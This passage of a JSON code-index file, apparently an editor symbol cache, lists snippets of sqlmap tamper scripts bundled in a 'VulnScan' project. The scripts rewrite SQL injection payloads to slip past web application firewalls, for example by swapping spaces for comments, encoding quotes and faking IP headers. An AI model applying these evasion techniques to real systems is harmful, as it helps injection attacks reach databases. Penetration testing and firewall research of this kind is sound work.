        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with comments '/**_**/'\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls\n    >>> tamper('SELECT id FROM users')\n    'SELECT/**_**/id/**_**/FROM/**_**/users'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "description": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with comments '/**_**/'\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morecomment",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "description": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s > 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.41\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "description": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.41\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ModSecurity SQL injection challenge,",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "description": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s > 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n')\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.41",
        "detail": "VulnScan.modules.sqlmap.tamper.space2morehash",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * Microsoft SQL Server\n    Tested against:\n        * Microsoft SQL Server 2000\n        * Microsoft SQL Server 2005",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * Microsoft SQL Server\n    Tested against:\n        * Microsoft SQL Server 2000\n        * Microsoft SQL Server 2005\n    Notes:\n        * Useful to bypass several web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MSSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * Microsoft SQL Server\n    Tested against:\n        * Microsoft SQL Server 2000",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mssqlblank",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "description": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n')\n    Requirement:\n        * MSSQL\n        * MySQL\n    Notes:\n        * Useful to bypass several web application firewalls\n    >>> tamper('1 AND 9227=9227')\n    '1%23%0AAND%23%0A9227=9227'",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "description": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n')\n    Requirement:\n        * MSSQL\n        * MySQL\n    Notes:\n        * Useful to bypass several web application firewalls\n    >>> tamper('1 AND 9227=9227')",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mssqlhash",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.1\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.1\n    Notes:\n        * Useful to bypass several web application firewalls\n    >>> random.seed(0)",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.1",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqlblank",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n')\n    Requirement:\n        * MySQL\n        * MSSQL\n    Notes:\n        * Useful to bypass several web application firewalls.",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n')\n    Requirement:\n        * MySQL\n        * MSSQL\n    Notes:\n        * Useful to bypass several web application firewalls.\n    >>> tamper('1 AND 9227=9227')\n    '1--%0AAND--%0A9227=9227'",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "description": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n')\n    Requirement:\n        * MySQL\n        * MSSQL\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.space2mysqldash",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2plus",
        "description": "VulnScan.modules.sqlmap.tamper.space2plus",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('+')\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n    >>> tamper('SELECT id FROM users')\n    'SELECT+id+FROM+users'",
        "detail": "VulnScan.modules.sqlmap.tamper.space2plus",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2plus",
        "description": "VulnScan.modules.sqlmap.tamper.space2plus",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('+')\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n    >>> tamper('SELECT id FROM users')\n    'SELECT+id+FROM+users'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.space2plus",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2plus",
        "description": "VulnScan.modules.sqlmap.tamper.space2plus",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('+')\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n    >>> tamper('SELECT id FROM users')",
        "detail": "VulnScan.modules.sqlmap.tamper.space2plus",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a random blank character from a valid set of alternate characters\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a random blank character from a valid set of alternate characters\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass several web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "description": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with a random blank character from a valid set of alternate characters\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.space2randomblank",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "description": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT\n    Tested against:\n        * PostgreSQL 9.6.12\n    Note:\n        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')",
        "detail": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "description": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT\n    Tested against:\n        * PostgreSQL 9.6.12\n    Note:\n        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')\n    'LEFT((SELECT usename FROM pg_user)::text,1)'\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')",
        "detail": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "description": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces PostgreSQL SUBSTRING with LEFT and RIGHT\n    Tested against:\n        * PostgreSQL 9.6.12\n    Note:\n        * Useful to bypass weak web application firewalls that filter SUBSTRING (but not LEFT and RIGHT)",
        "detail": "VulnScan.modules.sqlmap.tamper.substring2leftright",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "description": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)\n    >>> tamper(\"1 AND '1'='1\")\n    \"1 %26%26 '1'='1\"\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "description": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)\n    >>> tamper(\"1 AND '1'='1\")\n    \"1 %26%26 '1'='1\"\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = re.sub(r\"(?i)\\bAND\\b\", \"%26%26\", re.sub(r\"(?i)\\bOR\\b\", \"%7C%7C\", payload))\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "description": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "peekOfCode": "__priority__ = PRIORITY.LOWEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)\n    >>> tamper(\"1 AND '1'='1\")\n    \"1 %26%26 '1'='1\"\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.symboliclogical",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "description": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION ALL SELECT with UNION SELECT counterpart\n    >>> tamper('-1 UNION ALL SELECT')\n    '-1 UNION SELECT'\n    \"\"\"\n    return payload.replace(\"UNION ALL SELECT\", \"UNION SELECT\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "description": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION ALL SELECT with UNION SELECT counterpart\n    >>> tamper('-1 UNION ALL SELECT')\n    '-1 UNION SELECT'\n    \"\"\"\n    return payload.replace(\"UNION ALL SELECT\", \"UNION SELECT\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "description": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION ALL SELECT with UNION SELECT counterpart\n    >>> tamper('-1 UNION ALL SELECT')\n    '-1 UNION SELECT'\n    \"\"\"\n    return payload.replace(\"UNION ALL SELECT\", \"UNION SELECT\") if payload else payload",
        "detail": "VulnScan.modules.sqlmap.tamper.unionalltounion",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "description": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)\n    Notes:\n        * Useful for bypassing magic_quotes/addslashes feature\n    Reference:\n        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string\n    >>> tamper(\"1' AND 1=1\")",
        "detail": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "description": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)\n    Notes:\n        * Useful for bypassing magic_quotes/addslashes feature\n    Reference:\n        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string\n    >>> tamper(\"1' AND 1=1\")\n    '1%bf%27-- -'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "description": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)\n    Notes:\n        * Useful for bypassing magic_quotes/addslashes feature\n    Reference:\n        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string",
        "detail": "VulnScan.modules.sqlmap.tamper.unmagicquotes",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.uppercase",
        "description": "VulnScan.modules.sqlmap.tamper.uppercase",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with upper case value (e.g. select -> SELECT)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.uppercase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.uppercase",
        "description": "VulnScan.modules.sqlmap.tamper.uppercase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with upper case value (e.g. select -> SELECT)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.uppercase",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.uppercase",
        "description": "VulnScan.modules.sqlmap.tamper.uppercase",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with upper case value (e.g. select -> SELECT)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.uppercase",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.varnish",
        "description": "VulnScan.modules.sqlmap.tamper.varnish",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall\n    Reference:\n        * https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366\n    Notes:\n        Examples:\n        >> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)",
        "detail": "VulnScan.modules.sqlmap.tamper.varnish",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.varnish",
        "description": "VulnScan.modules.sqlmap.tamper.varnish",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall\n    Reference:\n        * https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366\n    Notes:\n        Examples:\n        >> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)\n        >> X-remote-IP: TARGET_PROXY_IP (184.189.250.X)\n        >> X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)",
        "detail": "VulnScan.modules.sqlmap.tamper.varnish",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.varnish",
        "description": "VulnScan.modules.sqlmap.tamper.varnish",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall\n    Reference:\n        * https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366\n    Notes:\n        Examples:",
        "detail": "VulnScan.modules.sqlmap.tamper.varnish",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each non-function keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0.18, 5.1.56, 5.5.11\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each non-function keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0.18, 5.1.56, 5.5.11\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "peekOfCode": "__priority__ = PRIORITY.HIGHER\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each non-function keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 4.0.18, 5.1.56, 5.5.11",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedkeywords",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s >= 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.56, 5.5.11\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.56, 5.5.11\n    Notes:\n        * Useful to bypass several web application firewalls when the\n          back-end database management system is MySQL",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "description": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "peekOfCode": "__priority__ = PRIORITY.HIGHER\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s >= 5.1.13\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Encloses each keyword with (MySQL) versioned comment\n    Requirement:\n        * MySQL >= 5.1.13\n    Tested against:\n        * MySQL 5.1.56, 5.5.11",
        "detail": "VulnScan.modules.sqlmap.tamper.versionedmorekeywords",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "description": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "peekOfCode": "def dependencies():\n    pass\ndef randomIP():\n    octets = []\n    while not octets or octets[0] in (10, 172, 192):\n        octets = random.sample(xrange(1, 255), 4)\n    return '.'.join(str(_) for _ in octets)\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Append a fake HTTP header 'X-Forwarded-For' (and alike)",
        "detail": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "documentation": {}
    },
    {
